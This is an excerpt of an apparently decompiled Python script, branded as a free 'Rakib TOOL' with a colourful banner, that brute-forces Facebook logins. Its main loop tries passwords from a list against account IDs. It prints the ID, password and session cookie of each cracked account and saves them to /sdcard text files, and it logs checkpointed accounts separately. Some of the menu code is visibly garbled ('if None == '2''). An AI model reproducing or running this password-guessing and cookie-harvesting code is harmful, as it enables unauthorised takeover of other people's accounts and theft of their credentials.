...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100028316808688')
        return None
    if None == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100028316808688 ')
        return None
...
logo =                                          ("""   
 ...
 ##:::. ##: ##:::: ##: ##::. ##:'####: ########::
..:::::..::..:::::..::..::::..::....::........:::                                                                                                          
\033[1;37m================= \33[32;45mRakib\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mWALEED\33[0;m\033[1;32m && \033[1;33mRakib\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Rakib islam
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mdivel33
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mRakib
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mRakib\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO Rakib TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(WALEED-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/WALEED-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(WALEED-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/WALEED-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[WALEED] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
